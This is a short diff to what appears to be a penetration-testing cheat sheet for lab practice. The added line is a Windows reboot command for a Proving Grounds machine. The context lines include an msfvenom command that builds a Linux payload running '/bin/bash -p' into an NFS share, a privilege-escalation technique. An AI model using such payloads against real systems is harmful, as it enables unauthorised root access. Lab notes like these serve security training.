@@ -584,3 +584,6 @@ accesschk.exe /accepteula
 
 Create binary to execute /bin/bash using msfvenom:
 msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+
+Reboot windows machine from OSPG:
+shutdown -r -t 10 && exit
